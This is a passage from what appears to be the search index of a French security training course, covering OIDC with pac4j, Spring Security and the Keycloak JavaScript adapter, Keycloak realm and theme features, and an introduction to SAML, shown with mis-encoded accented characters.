oidcProfile.getAttributes();   Il faut connaitre le nom des claims souhaitÃ©s :  h.get(\u0026quot;email\u0026quot;)  Gestion des droits # Pour mapper des roles, il faut implÃ©menter selon le besoin un gÃ©nÃ©rateur de roles Ã  partir du profile (accessToken notemment)\noidcClient.addAuthorizationGenerator(new AuthorizationGenerator() { @Override public Optional\u0026lt;UserProfile\u0026gt; generate(WebContext context, SessionStore sessionStore, UserProfile profile) { return Optional.empty(); } });  Peut s\u0026rsquo;utiliser dans le code directement\noidcProfile.getRoles(); request.isUserInRole(\u0026quot;admin\u0026quot;);  ou gÃ©rÃ© par rÃ¨gles dans la config\nconfig.addAuthorizer(\u0026quot;admin\u0026quot;, new RequireAnyRoleAuthorizer(\u0026quot;admin\u0026quot;));  PossiblitÃ© de l\u0026rsquo;implÃ©mentation keycloak incluse\nvar profileCreator = new OidcProfileCreator(oidcConfig, oidcClient); profileCreator.setProfileDefinition( new OidcProfileDefinition(x -\u0026gt; new KeycloakOidcProfile())); oidcClient.setProfileCreator(profileCreator); oidcClient.addAuthorizationGenerator( new KeycloakRolesAuthorizationGenerator());  Connexion Ã  un web service, authentifiÃ© par un jeton # Obtenir le jeton pour se connecter Ã  un Web Service\noidcProfile.getAccessToken().value()   Il faut ensuite ajouter l\u0026rsquo;entÃªte \u0026ldquo;Authorization: Bearer tokenString\u0026rdquo; pour accÃ©der au WS  oidcProfile.getAccessToken().toAuthorizationHeader()   Un test peut Ãªtre fait sur le WS embarquÃ© de keycloak : https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/userinfo  Logout # ConcrÃ¨tement, il s\u0026rsquo;agit d\u0026rsquo;une :\n DÃ©connexion locale : request.getSession().invalidate(); DÃ©connexion Keycloak : un appel sur https://mon.serveur.keycloak/auth/realms/formation/protocol/openid-connect/logout?redirect_uri=https://localhost:8443/ logout l\u0026rsquo;utilisateur sur Keycloak et redirige vers \u0026ldquo;redirect_uri\u0026rdquo;  \u0026lt;!-- Logout configuration --\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;logoutFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.pac4j.jee.filter.LogoutFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;centralLogout\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;true\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;logoutUrlPattern\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;.*\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;defaultUrl\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;http://localhost:8080/\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;logoutFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/logout\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt;  Bonus : CSRF # Config :\nconfig.addAuthorizer(\u0026quot;csrfToken\u0026quot;, new CsrfAuthorizer());  Controller :\nvar gen = new DefaultCsrfTokenGenerator(); var csrfToken = gen.get(context, JEESessionStore.INSTANCE); model.addAttribute(\u0026quot;_csrf_token_name\u0026quot;, Pac4jConstants.CSRF_TOKEN); model.addAttribute(\u0026quot;_csrf_token\u0026quot;, csrfToken);  Ecran :\n\u0026lt;form th:action=\u0026quot;@{/private}\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; th:value=\u0026quot;${_csrf_token}\u0026quot; th:name=\u0026quot;${_csrf_token_name}\u0026quot;/\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;C'est parti !!\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt;  Environnement de production #  Il faut Ãªtre capable d\u0026rsquo;adapter facilement l\u0026rsquo;application au diffÃ©rents environnements : local, dv/qf, prod Il y a une conf commune localhost par realm (une confidential, une public) Une demande doit Ãªtre faite pour les environnement de dv/qf : une seule configuration pour tous les environnements dv/qf Une demande doit Ãªtre faite pour la prod : en cas de confidential, seule la prod aura accÃ¨s au secret  Cas du filtre Keycloak\n Le json peut Ãªtre paramÃ©trÃ© pour s\u0026rsquo;adapter Ã  des propriÃ©tÃ©s systÃ¨mes (avec valeurs par dÃ©faut sur localhost par exemple)  { \u0026quot;realm\u0026quot;: \u0026quot;${fr.insee.keycloak.realm:formation}\u0026quot;, \u0026quot;auth-server-url\u0026quot;: \u0026quot;${fr.insee.keycloak.server:https://mon.serveur.keycloak/auth}\u0026quot;, \u0026quot;ssl-required\u0026quot;: \u0026quot;none\u0026quot;, \u0026quot;resource\u0026quot;: \u0026quot;${fr.insee.keycloak.resource:localhost-web}\u0026quot;, \u0026quot;credentials\u0026quot;: { \u0026quot;secret\u0026quot;: \u0026quot;${fr.insee.keycloak.credentials.secret:abcd_1234_abcd}\u0026quot; }, \u0026quot;confidential-port\u0026quot;: 0, \u0026quot;principal-attribute\u0026quot;: \u0026quot;preferred_username\u0026quot; }   Il faut rajouter ces variables au dÃ©marrage de la jvm (-Dfr.insee.keycloak.realm=monRealm)  OIDC et Spring security # Adapter Spring security module oAuth2 # DÃ©pendances :\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-oauth2-resource-server\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt;  Adapter Spring security module oAuth2 # Configuration particuliÃ¨re de spring security\n@Configuration @EnableWebSecurity public class MySecurityConfigurationAdapter { @Bean public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception { // Cas d'un webservice : // - ne pas gerer les sessions // - pas de csrf http.sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS); http.csrf().disable(); // Descriptions des regles d'accÃ¨s par path http.authorizeHttpRequests( requests -\u0026gt; requests // Ignorer le path du swagger .requestMatchers(HttpMethod.GET, \u0026quot;/swagger-ui/**\u0026quot;, \u0026quot;/v3/api-docs/**\u0026quot;) .permitAll() .requestMatchers(HttpMethod.GET, \u0026quot;/\u0026quot;, \u0026quot;/healthcheck\u0026quot;) .permitAll() .requestMatchers(HttpMethod.GET, \u0026quot;/private\u0026quot;) .authenticated() .requestMatchers(HttpMethod.GET, \u0026quot;/admin\u0026quot;) .hasRole(\u0026quot;admin\u0026quot;) .requestMatchers(HttpMethod.OPTIONS) .permitAll() .anyRequest() .denyAll()); // Moyens d'authentification : oAuth2 bearer http.oauth2ResourceServer( // pour personnaliser l'authenticator oauth2 -\u0026gt; oauth2.jwt( jwtConfigurer -\u0026gt; { jwtConfigurer.jwtAuthenticationConverter(jwtAuthenticationConverter()); })); return http.build(); } }  // web service = pas de gestion de session http.sessionManagement() .sessionCreationPolicy(SessionCreationPolicy.STATELESS); // pas de formulaire =\u0026gt; pas de csrf http.csrf().disable(); // gestion des accÃ¨s http.authorizeRequests( requests -\u0026gt; // Fonction des droits ) .oauth2ResourceServer();  Fonction de droits\nauthz -\u0026gt; authz.antMatchers(HttpMethod.GET, \u0026quot;/private\u0026quot;) // CONDITION .authenticated(). // UTILISATEUR AUTHENTIFIE SANS CONTROLE antMatchers(HttpMethod.GET,\u0026quot;/admin\u0026quot;) // CONDITION .hasRole(\u0026quot;admin\u0026quot;) // CONTROLE DU ROLE .antMatchers(HttpMethod.OPTIONS).permitAll() // pour les requetes CORS .antMatchers(\u0026quot;error\u0026quot;, \u0026quot;/\u0026quot;,\u0026quot;/accueil\u0026quot;).permitAll() // Chemins publics .anyRequest().denyAll() // Dans le doute le reste est interdit  Configuration via SpringBoot\n Seul l\u0026rsquo;emplacement des certificat est nÃ©cessaire. La conf se retrouve ici : http://localhost:8180/auth/realms/test/.well-known/openid-configuration  spring.security.oauth2.resourceserver.jwt.jwk-set-uri=http://localhost:8180/auth/realms/test/protocol/openid-connect/certs  Recherche des roles #  Comme souvent, se rÃ©implÃ©mente !  http.oauth2ResourceServer(oauth2 -\u0026gt; oauth2.jwt(jwtConfigurer -\u0026gt; { jwtConfigurer.jwtAuthenticationConverter( jwtAuthenticationConverter()); }));  private JwtAuthenticationConverter jwtAuthenticationConverter() { JwtAuthenticationConverter jwtAuthenticationConverter = new JwtAuthenticationConverter(); jwtAuthenticationConverter.setJwtGrantedAuthoritiesConverter(jwtGrantedAuthoritiesConverter()); jwtAuthenticationConverter.setPrincipalClaimName(\u0026quot;preferred_username\u0026quot;); return jwtAuthenticationConverter; }  @SuppressWarnings(\u0026quot;unchecked\u0026quot;) private Converter\u0026lt;Jwt, Collection\u0026lt;GrantedAuthority\u0026gt;\u0026gt; jwtGrantedAuthoritiesConverter() { return source -\u0026gt; { String[] claimPath = OIDC_CLAIM_ROLE.split(\u0026quot;\\\\.\u0026quot;); Map\u0026lt;String, Object\u0026gt; claims = source.getClaims(); try { for (int i = 0; i \u0026lt; claimPath.length - 1; i++) { claims = (Map\u0026lt;String, Object\u0026gt;) claims.get(claimPath[i]); } List\u0026lt;String\u0026gt; roles = (List\u0026lt;String\u0026gt;) claims.getOrDefault(claimPath[claimPath.length - 1], new ArrayList\u0026lt;\u0026gt;()); return roles.stream() .map( s -\u0026gt; new GrantedAuthority() { @Override public String getAuthority() { return \u0026quot;ROLE_\u0026quot; + s; } @Override public String toString() { return getAuthority(); } }) .collect(Collectors.toList()); } catch (ClassCastException e) { // role path not correctly found, assume that no role for this user return new ArrayList\u0026lt;\u0026gt;(); } }; }  Obtenir le jeton (appel Ã  web service)\nJwtAuthenticationToken token = (JwtAuthenticationToken) request.getUserPrincipal(); maRequete.header(\u0026quot;Authorization\u0026quot;, \u0026quot;Bearer \u0026quot; + token.getToken());  DÃ©pendances adapters java Keycloak (JEE et Spring Security) #  Ces adapters Ã©taient plus facile Ã  configurer dans notre environnement Keycloak (prÃ©vus pour !) C\u0026rsquo;est toujours un plus de ne pas dÃ©pendre d\u0026rsquo;une implÃ©mentation mais d\u0026rsquo;un standard (OIDC/OAuth) Le projet keycloak abandonne le support des adapters Keycloak  "}).add({id:17,href:"/docs/authentification/oidc/oidc-js/",title:"OpenID Connect en js",description:"Keycloak et javascript # Fonctionnement (adapter js Keycloak)\n Keycloak s\u0026rsquo;initialise (prÃ©paration des mÃ©thodes) et attend un login Au login Keycloak place dans le localStorage (ou Cookie en cas d\u0026rsquo;Ã©chec) le state L\u0026rsquo;utilisateur est redirigÃ© vers Keycloak, il s\u0026rsquo;authentifie et il est redirigÃ© vers l\u0026rsquo;application initiale avec en paramÃ¨tre un code. En revenant vers l\u0026rsquo;application avec les paramÃ¨tres code et state, la phase d\u0026rsquo;initialisation de Keycloak comprend que l\u0026rsquo;authentification a Ã©tÃ© faite, il controle le state L\u0026rsquo;adapter crÃ©e un iframe, qui se connecte Ã  Keycloak avec le code pour obtenir les token (access,refresh,id)  -- SÃ©curitÃ© ?",content:"Keycloak et javascript # Fonctionnement (adapter js Keycloak)\n Keycloak s\u0026rsquo;initialise (prÃ©paration des mÃ©thodes) et attend un login Au login Keycloak place dans le localStorage (ou Cookie en cas d\u0026rsquo;Ã©chec) le state L\u0026rsquo;utilisateur est redirigÃ© vers Keycloak, il s\u0026rsquo;authentifie et il est redirigÃ© vers l\u0026rsquo;application initiale avec en paramÃ¨tre un code. En revenant vers l\u0026rsquo;application avec les paramÃ¨tres code et state, la phase d\u0026rsquo;initialisation de Keycloak comprend que l\u0026rsquo;authentification a Ã©tÃ© faite, il controle le state L\u0026rsquo;adapter crÃ©e un iframe, qui se connecte Ã  Keycloak avec le code pour obtenir les token (access,refresh,id)  -- SÃ©curitÃ© ?\n Rappel problÃ©matique : personne en dehors de l\u0026rsquo;appli et de l\u0026rsquo;utilisateur ne doit avoir d\u0026rsquo;info sur le jeton Appli Web : aucun problÃ¨me, l\u0026rsquo;utilisateur n\u0026rsquo;a jamais connaissance du jeton, il ne connait qu\u0026rsquo;un code Ã  usage unique, l\u0026rsquo;Ã©change de jeton se fait entre le serveur et Keycloak via un secret. Appli Javascript : appli \u0026ldquo;locale\u0026rdquo;, l\u0026rsquo;utilisateur manipule directement son jeton en local. Pas de possibilitÃ© de secret, car le code est local. Un pirate peut donc crÃ©er son appli javascript ressemblant Ã  la notre, en incluant une brique keycloak et l\u0026rsquo;utilisateur fournirait ainsi son jeton au pirate. Le jeton permet ensuite de se connecter Ã  d\u0026rsquo;autres services. Le seul moyen de sÃ©curiser est donc pour Keycloak de s\u0026rsquo;assurer que l\u0026rsquo;appli demandant une authentification a bien le droit, et pour cela seule l\u0026rsquo;url de l\u0026rsquo;application demandant autorisation peut permettre un filtre  Deux fonctionnements\n  Par redirection : on peut spÃ©cifier les urls de redirection autorisÃ©es par Keycloak\n  Par CORS : on spÃ©cifie les domaines sources qui peuvent demander une authentification\n  Une possibilitÃ© simple : utiliser l\u0026rsquo;adapter keycloak directement disponible sur le serveur Keycloak en https://mon.serveur.keycloak/auth/js/keycloak.js\n  Met Ã  disposition un objet Keycloak, documentation sur https://www.keycloak.org/docs/latest/securing_apps/#_javascript_adapter\n  var keycloak = Keycloak(); // recherche un keycloak.json dans le dossier courant keycloak.init(); // prÃ©pare l'objet keycloak.login(); keycloak.logout();   Configuration via keycloak.json, par dÃ©faut dÃ©tecter dans le mÃªme dossier que la page  { \u0026quot;realm\u0026quot;: \u0026quot;formation-secu-applicative\u0026quot;, \u0026quot;resource\u0026quot;: \u0026quot;client-test-js\u0026quot;, \u0026quot;auth-server-url\u0026quot;: \u0026quot;https://mon.serveur.keycloak/auth\u0026quot; }   ou Keycloak(\u0026lsquo;chemin vers fichier json\u0026rsquo;) Configuration sans fichier annexe  var keycloak = Keycloak({ url : 'https://mon.serveur.keycloak/auth', realm : 'formation', clientId : 'client-test-js' });   Pour rendre le login automatique sur une page  keycloak.init({ onLoad : 'login-required' });   Pour vÃ©rifier si l\u0026rsquo;utilisateur est connectÃ© sans l\u0026rsquo;authentifier  keycloak.init({ onLoad : 'check-sso' });   Effectuer des opÃ©ration aprÃ¨s authentification  keycloak.init({ onLoad : 'login-required' }).success(function(){ //L'utilisateur est forcÃ©ment connectÃ© ici })  keycloak.init().success(function(authenticated){ //authenticated = true si l'utilisateur est connectÃ© });  Code d\u0026rsquo;un bouton \u0026ldquo;Se connecter\u0026rdquo;\n keycloak.login()   Rafraichir le jeton  keycloak.updateToken();   Rafraichir le jeton si nÃ©cessaire, c\u0026rsquo;est Ã  dire uniquement s\u0026rsquo;il expire dans les X secondes  keycloak.updateToken(X);   Appel au backend/ Ã  un web service On rafraichit le jeton s\u0026rsquo;il expire \u0026ldquo;bientÃ´t\u0026rdquo; pour ne pas avoir de surprises si le traitement dure un peu  keycloak.updateToken(30).success(function() { var url = 'https://localhost:8443/ws/ressource'; var req = new XMLHttpRequest(); req.open('GET', url, true); req.setRequestHeader('Accept', 'application/json'); req.setRequestHeader('Authorization', 'Bearer ' + keycloak.token); req.onreadystatechange = function() { if (req.readyState == 4) { if (req.status == 200) { $(\u0026quot;#userinfo\u0026quot;).text(req.responseText); } else if (req.status == 403) { alert('Forbidden'); } } } req.send(); }; })   Logout avec la fonction keycloak.logout() Peut prendre en argument le lien de redirection aprÃ¨s logout cÃ´tÃ© keycloak  keycloak.logout({ redirectUri : 'https://localhost:8443' });   On ne parle que de logout cÃ´tÃ© serveur Keycloak, il n\u0026rsquo;y a par dÃ©faut aucune notion de session cÃ´tÃ© client. On peut Ã©ventuellement gÃ©rer une notion de session via localStorage/localSession mais c\u0026rsquo;est alors au script de le gÃ©rer de son cÃ´tÃ©.  Et avec React ? # Les scripts keycloak peuvent Ãªtre rÃ©cupÃ©rÃ©s comme dÃ©pendance :\nnpm install keycloak-js  import Keycloak from 'keycloak-js'; var keycloak = Keycloak( { url: 'https://mon.serveur.keycloak/auth', realm: 'formation', clientId: 'localhost-frontend' });  Avec this.props.init une action qui ajoute l\u0026rsquo;objet keycloak dans le store\nInteracton entre composant React et Keycloak # NE PAS UTILISER LE LOCALSTORAGE POUR GERER LE TOKEN\n Avis de Auth0 ProblÃ¨me de sÃ©curitÃ© : localstorage un peu trop accessible, d\u0026rsquo;une faÃ§on gÃ©nÃ©rale on ne stocke pas un objet si on a la possibilitÃ© de le laisser en mÃ©moire L\u0026rsquo;objet sÃ©rialisÃ© demande des bidouilles pour Ãªtre regÃ©nÃ©rÃ© correctement React est SPA : utiliser au maximum redux pour ne pas avoir Ã  utiliser le localStorage ou sessionStorage  En pratique :\n Un composant de login qui gÃ¨re la crÃ©ation, initialisation, connexion de Keycloak, et le stocke dans le store Les autres composants pevent se servir dans le store s\u0026rsquo;ils demandent authentification  componentDidMount() { if (!this.state.keycloakInitiated) { var keycloak = Keycloak(); //Pour un login automatique // keycloak.init({onLoad: 'login-required'}).success(() =\u0026gt; {this.props.init(keycloak); }); keycloak.init().success(() =\u0026gt; { this.props.init(keycloak); } ); } }  Avec this.props.init une action qui ajoute l\u0026rsquo;objet keycloak dans le store\nInteraction entre composant React et Keycloak # Gestion de l\u0026rsquo;expiration du token\n Ajout d\u0026rsquo;un interceptor dans axios  axios.interceptors.request.use( async (config) =\u0026gt; { // On attend une mise Ã  jour du token si nÃ©cessaire await new Promise((resolve, reject) =\u0026gt; { store.getState().keycloak.updateToken(30).success(() =\u0026gt; { resolve(); }).error(() =\u0026gt; reject()); }); config.headers.Authorization = 'Bearer ' + store.getState().keycloak.token; return config; } )  RÃ©duire la dÃ©pendance Ã  Keycloak : Librairie Axa # Librairie proposant une implÃ©mentation plus gÃ©nÃ©rique de oAuth https://github.com/AxaGuilDEv/react-oidc\nElle possÃ¨de Ã©galement une mailleure intÃ©gration Ã  React avec la mise Ã  disposition de hook\n"}).add({id:18,href:"/docs/authentification/oidc/keycloak/",title:"FonctionnalitÃ©s spÃ©cifiques d'un idp : exemple de Keycloak",description:"5 # FonctionnalitÃ©s Keycloak # Keycloak #  Keycloak : gestion de royaumes distincts : chacun ayant ses utilisateurs, son thÃ¨me  Keycloak # Du point de vue serveur, Keycloak permet :\n La gestion d\u0026rsquo;un thÃ¨me par realm et mÃªme par client La dÃ©lÃ©gation de l\u0026rsquo;administration sur un realm  Keycloak fournit une application aux utilisateurs : l\u0026rsquo;application \u0026ldquo;Account\u0026rdquo;\nApplication \u0026ldquo;Account\u0026rdquo; # Application permettant aux utilisateurs de consulter leur compte.",content:"5 # FonctionnalitÃ©s Keycloak # Keycloak #  Keycloak : gestion de royaumes distincts : chacun ayant ses utilisateurs, son thÃ¨me  Keycloak # Du point de vue serveur, Keycloak permet :\n La gestion d\u0026rsquo;un thÃ¨me par realm et mÃªme par client La dÃ©lÃ©gation de l\u0026rsquo;administration sur un realm  Keycloak fournit une application aux utilisateurs : l\u0026rsquo;application \u0026ldquo;Account\u0026rdquo;\nApplication \u0026ldquo;Account\u0026rdquo; # Application permettant aux utilisateurs de consulter leur compte. Elle permet :\n Le changement de mot de passe L\u0026rsquo;activation de l\u0026rsquo;authentification forte La consultation des sessions en cours et des logs de connexion du compte La consultation des rÃ´les  Application \u0026ldquo;Account\u0026rdquo; # Pour rajouter le lien vers account depuis son application avec un bouton de retour Ã  l\u0026rsquo;application : https://my.keycloak.server/auth/realms/my-realm/account?referrer=client-test-web\u0026amp;referrer_uri=https://localhost:8443/\n(il faut dÃ©jÃ  Ãªtre connÃ©ctÃ© sur le realm sinon Ã§a fait n\u0026rsquo;importe quoi)\nLancer un Keycloak local # Pour tester sans risques certaines manipulation, il est aisÃ© de lancer un keycloak local sur son poste.\n TÃ©lÃ©charger l\u0026rsquo;installation standalone : https://www.keycloak.org/downloads.html Lancer /pathKeycloak/bin/standalone.bat Le serveur dÃ©marre sur http://localhost:8080 et https://locahost:8443 Sur la page d\u0026rsquo;accueil chosir \u0026ldquo;Administration console\u0026rdquo; Vous pouvez vraiment administrer votre serveur local, les configurations sont sauvegardÃ©es d\u0026rsquo;une utilisation Ã  l\u0026rsquo;autre  GÃ©rer un realm # Documentation officielle\nPersonnaliser le thÃ¨me pour son realm (ou pour son application) #  Configuration globale pour le thÃ¨me sur le realm PossibilitÃ© d\u0026rsquo;une configuration spÃ©cifique de l\u0026rsquo;Ã©cran de login pour une application cliente d\u0026rsquo;un realm  Techno\n Template + pages Ã©crit en ftl Fichiers de messages, potentiellement en plusieurs langues PosibilitÃ© de prendre un thÃ¨me standard en changeant quelques textes (comme avec Shibboleth)  Personnalisation possible pour :\n Ã‰cran de login Application \u0026ldquo;Account\u0026rdquo; email (activation, rÃ©initialisation de mdp)  Tester le thÃ¨me #  Ajouter des thÃ¨mes dans /pathKeycloak/themes et le parmÃ©trer dans la conf realm Vous pouvez vous inspirez du thÃ¨me keycloak prÃ©sent de base Ou partir d\u0026rsquo;un thÃ¨me insee du projet keycloak thÃ¨mes Actuellement thÃ¨mes Insee proposÃ©s :  \u0026ldquo;insee-generic\u0026rdquo; : proche de l\u0026rsquo;actuel thÃ¨me de la fÃ©dÃ©ration d\u0026rsquo;identitÃ© \u0026ldquo;insee-minimal\u0026rdquo; : thÃ¨me Insee avec le moins de changement possible par rapport au thÃ¨me keycloak    PossibilitÃ©s de Keycloak sur les rÃ´les # Souhaitable\n Gestion de scope de rÃ´les : on ne fournit Ã  l\u0026rsquo;application cliente que les rÃ´les dont elle a besoin.  PossibilitÃ©s \u0026ldquo;manuelles\u0026rdquo;\n Roles dÃ©duits : on peut prÃ©ciser que le rÃ´le d\u0026rsquo;administrateur implique celui d\u0026rsquo;utilisateur. Cela permet de ne spÃ©cifier que le rÃ´le d\u0026rsquo;admin sur l\u0026rsquo;annuaire Roles composites : combinaisons de plusieurs rÃ´les Roles dÃ©duits d\u0026rsquo;une autentification en particulier (cas de redirection vers fournisseur interne)  Existe mais peu compatible avec notre archtecture\n Roles spÃ©cifiques Ã  un client, (par dÃ©faut propre au realm).  Cas particuliers # France Connect #  Le dispositif France Connect utilise OpenIdConnect L\u0026rsquo;inscription Ã  France Connect n\u0026rsquo;est pas une opÃ©ration anodine France connect est proposÃ© comme fournisseur d\u0026rsquo;identitÃ© pour Keycloak  Besoin de plusieurs realms # 2 cas :\n Le deuxiÃ¨me realm est un realm secondaire : une application ouverte sur internet dÃ©diÃ© aux agents Insee doit Ãªtre accessible par formulaire depuis Internet mais par Kerberos en interne : le realm agents-insee-interne et une alternative Ã  insee-ssp Les diffÃ©rents realms sont indÃ©pendant : une application transverse sur laquelle peuvent se connecter divers acteurs issus d\u0026rsquo;application diffÃ©rentes  Cas d\u0026rsquo;un realm secondaire #  Similaire Ã  une situation s\u0026rsquo;authentifier avec Google, Facebook,\u0026hellip; Un fournisseur d\u0026rsquo;identitÃ© est crÃ©Ã© cÃ´tÃ© Keycloak : auth.insee.fr/\u0026hellip;/agents-insee-interne devient fourniseur d\u0026rsquo;identitÃ© pour auth.insee.net/\u0026hellip;/insee-ssp CÃ´tÃ© application, seul le realm principal doit Ãªtre dÃ©clarÃ© Remarque : la dÃ©claration de fournisseur d\u0026rsquo;identitÃ© est en OpenIDConnect si les deux realms sont sur le mÃªme serveur, en SAML s\u0026rsquo;ils sont sur interne et DMZ, une question de flux.  Cas d\u0026rsquo;un realm secondaire # il est possible de forcer keycloak Ã  utiliser un fournisseur de service secondaire, par exemple si un discovery service est utilisÃ© pour savoir oÃ¹ se situe l\u0026rsquo;utilisateur :\nApplis web :\nGET /myapplication.com?kc_idp_hint=sso-insee  Applis JS :\nvar keycloak = new Keycloak('keycloak.json'); keycloak.login({ idpHint: 'sso-insee' });  Cas de plusieurs realms indÃ©pendants #  Le filtre Keycloak propose une interface pour founir dynamiquement une configuration keycloak https://www.keycloak.org/docs/latest/securing_apps/index.html#_multi_tenancy DÃ©claration d\u0026rsquo;une classe resolver de conf  Cas de plusieurs realms indÃ©pendants # public class MyKeycloakConfigResolver implements KeycloakConfigResolver { @Override public KeycloakDeployment resolve(Request facade) { if (facade.getCookie(\u0026quot;realm\u0026quot;) != null) { String realmDemande = facade.getCookie(\u0026quot;realm\u0026quot;).getValue(); InputStream is; if (realmDemande.equals(\u0026quot;keycloak1\u0026quot;)) { is = getClass().getClassLoader().getResourceAsStream(\u0026quot;keycloak1.json\u0026quot;); } else { is = getClass().getClassLoader().getResourceAsStream(\u0026quot;keycloak2.json\u0026quot;); } return KeycloakDeploymentBuilder.build(is); } else { return null; } } }  Cas de plusieurs realms indÃ©pendants # \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;Keycloak Filter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.keycloak.adapters.servlet.KeycloakOIDCFilter\u0026lt;/filter-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;keycloak.config.resolver\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;fr.insee.demo.multi.tenant.MyKeycloakConfigResolver\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/filter\u0026gt;  "}).add({id:19,href:"/docs/authentification/saml/",title:"Fonctionnement de SAML",description:"Les grands principes # Security Assertion Markup Language ou langage de balisage d\u0026rsquo;assertion de sÃ©curitÃ©\n  DÃ©diÃ© aux applis Web\n  L\u0026rsquo;utilisateur est au coeur de son authentification\n  Jeton Ã©changÃ© via XML\n  L\u0026rsquo;application cliente (Service Provider ou SP) demande une authentification\n  Elle redirige l\u0026rsquo;utilisateur vers un IDP ou Identity Provider, en transmettant une requÃªte d\u0026rsquo;authentification donnant notemment des informations sur le SP. Ce n\u0026rsquo;est pas obligatoire dans le protocole mais la requÃªte doit Ãªtre signÃ©e (clÃ© privÃ©e du SP) et chiffrÃ©e (clÃ© publique de l\u0026rsquo;IDP)",content:"Les grands principes # Security Assertion Markup Language ou langage de balisage d\u0026rsquo;assertion de sÃ©curitÃ©\n  DÃ©diÃ© aux applis Web\n  L\u0026rsquo;utilisateur est au coeur de son authentification\n  Jeton Ã©changÃ© via XML\n  L\u0026rsquo;application cliente (Service Provider ou SP) demande une authentification\n  Elle redirige l\u0026rsquo;utilisateur vers un IDP ou Identity Provider, en transmettant une requÃªte d\u0026rsquo;authentification donnant notemment des informations sur le SP. Ce n\u0026rsquo;est pas obligatoire dans le protocole mais la requÃªte doit Ãªtre signÃ©e (clÃ© privÃ©e du SP) et chiffrÃ©e (clÃ© publique de l\u0026rsquo;IDP)\n  L\u0026rsquo;IDP recherche le SP appelant, vÃ©rifie la signature et cherche Ã  authentifier l\u0026rsquo;utilisateur\n  En cas de rÃ©ussite, il redirige vers le SP avec une assertion qu\u0026rsquo;il signe (clÃ© privÃ©e de l\u0026rsquo;IDP) et chiffre (clÃ© publique du SP).\n  Le SP valide l\u0026rsquo;assertion\n  CC BY-SA 3.0, Link Du SAML Ã  l\u0026rsquo;Ã¨re d\u0026rsquo;OpenIdConnect ? #  NÃ©cessaire si l\u0026rsquo;application cliente et le serveur d\u0026rsquo;authentification ne sont pas connectÃ©s directement (Un en interne, un en DMZ) Applications atypiques ne supportant que SAML (progiciel,\u0026hellip;)  Contenu d\u0026rsquo;une configuration SAML #  Les fichiers metadatas du SP et des IDP : Ã©lÃ©ments centraux des configuration SAML Un keystore contenant la clÃ© privÃ© et le certificat du Service provider : permet de signer les requÃªtes et de dÃ©chiffrer les rÃ©ponses Selon les implÃ©mentations, il faut extraire des informations des fichiers metadatas et les prÃ©senter comme des paramÃ¨tres.  Le metadata SAML #  Une application cliente connait un ou plusieurs IDP Un IDP connait une liste d\u0026rsquo;application  Un moyen simple de s\u0026rsquo;Ã©changer les informations sur un client ou un IDP est le metadata\nMetadata d\u0026rsquo;un SP # \u0026lt;md:EntityDescriptor ... entityID=\u0026quot;https://localhost:8443\u0026quot;\u0026gt; \u0026lt;md:SPSSODescriptor AuthnRequestsSigned=\u0026quot;true\u0026quot; WantAssertionsSigned=\u0026quot;true\u0026quot; ...\u0026gt; \u0026lt;md:KeyDescriptor use=\u0026quot;signing\u0026quot;\u0026gt;\u0026lt;ds:KeyInfo ...\u0026gt;\u0026lt;ds:X509Data\u0026gt;\u0026lt;ds:X509Certificate\u0026gt;Certificat du SP (clÃ© plublique)\u0026lt;/ds:X509Certificate\u0026gt;\u0026lt;/ds:X509Data\u0026gt;\u0026lt;/ds:KeyInfo\u0026gt;\u0026lt;/md:KeyDescriptor\u0026gt; \u0026lt;md:KeyDescriptor use=\u0026quot;encryption\u0026quot;\u0026gt;\u0026lt;ds:KeyInfo ...\u0026gt;\u0026lt;ds:X509Data\u0026gt;\u0026lt;ds:X509Certificate\u0026gt;Certificat du SP (clÃ© plublique)\u0026lt;/ds:X509Certificate\u0026gt;\u0026lt;/ds:X509Data\u0026gt;\u0026lt;/ds:KeyInfo\u0026gt;\u0026lt;/md:KeyDescriptor\u0026gt; \u0026lt;!-- Indique oÃ¹ rediriger la requÃªte dans le cas d'une demande de SLO selon le type de bind --\u0026gt; \u0026lt;md:SingleLogoutService Binding=\u0026quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect\u0026quot; Location=\u0026quot;https://localhost:8443/saml/LogoutServiceHTTPRedirect\u0026quot; ResponseLocation=\u0026quot;https://localhost:8443/saml/LogoutServiceHTTPRedirectResponse\u0026quot; /\u0026gt; 